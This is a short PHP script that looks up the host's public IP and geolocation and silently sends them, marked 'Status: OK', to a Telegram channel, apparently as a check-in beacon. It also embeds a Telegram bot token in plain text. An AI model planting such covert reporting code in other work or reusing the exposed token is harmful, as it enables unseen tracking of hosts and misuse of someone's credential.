<?php
$botToken = "8484589113:AAFcTLM7_0N6jgFNtQZkO-zJYqQTQ3naj0";
$chatID   = "@winssave12";

// Ambil IP publik dari api.ipify.org
$ip = trim(@file_get_contents("https://api.ipify.org"));
if (!$ip) $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// Ambil detail lokasi
$city = $country = 'Unknown';
$response = @file_get_contents("https://ipinfo.io/{$ip}/json");
if ($response) {
    $data = json_decode($response, true);
    $city = $data['city'] ?? 'Unknown';
    $country = $data['country'] ?? 'Unknown';
}

// Kirim ke Telegram
$text = "📍 <b>Status:</b> OK\n<b>IP:</b> $ip\n<b>City:</b> $city\n<b>Country:</b> $country";
$url  = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($text) . "&parse_mode=HTML";
@file_get_contents($url);

echo json_encode(["status" => "ok", "ip" => $ip, "city" => $city, "country" => $country]);
?>
